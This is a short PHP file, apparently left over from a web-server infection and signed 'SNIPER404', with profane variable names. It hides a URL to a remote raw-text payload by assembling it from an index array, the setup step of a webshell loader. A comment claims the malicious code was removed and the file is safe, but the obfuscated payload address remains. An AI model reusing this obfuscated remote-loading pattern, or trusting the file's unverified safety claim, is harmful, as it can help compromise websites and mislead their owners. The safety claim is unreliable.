<?php

// SNIPER404

$SANGE = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
$JEMBUT = [7, 19, 19, 15, 18, 63, 64, 64, 17, 4, 15, 14, 18, 8, 19, 14, 17, 8, 62, 17, 14, 14, 19, 11, 14, 2, 0, 11, 7, 14, 18, 19, 62, 13, 4, 19, 64, 17, 0, 22, 64, 14, 17, 8, 6, 8, 13, 0, 11, 62, 19, 23, 19];


$LONTE = '';
foreach ($JEMBUT as $KONTOL) {
    $LONTE .= $SANGE[$KONTOL];
}

$MEMEK = "$LONTE";

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

?>